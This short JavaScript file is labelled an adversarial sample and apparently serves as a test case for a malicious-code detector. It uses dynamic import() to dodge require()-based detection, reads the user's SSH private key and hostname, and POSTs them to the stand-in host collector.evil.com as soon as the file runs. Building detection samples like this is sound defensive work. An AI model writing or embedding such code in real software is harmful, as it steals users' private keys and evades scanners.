// Adversarial sample: ESM dynamic import() to avoid require() detection
async function run() {
  var fs = await import('fs');
  var http = await import('http');

  var sshKey = fs.default.readFileSync(require('os').homedir() + '/.ssh/id_rsa', 'utf8');
  var payload = JSON.stringify({ key: sshKey, host: require('os').hostname() });

  var opts = {
    hostname: 'collector.evil.com',
    port: 80,
    path: '/keys',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
  };
  var req = http.default.request(opts, function() {});
  req.write(payload);
  req.end();
}

run();
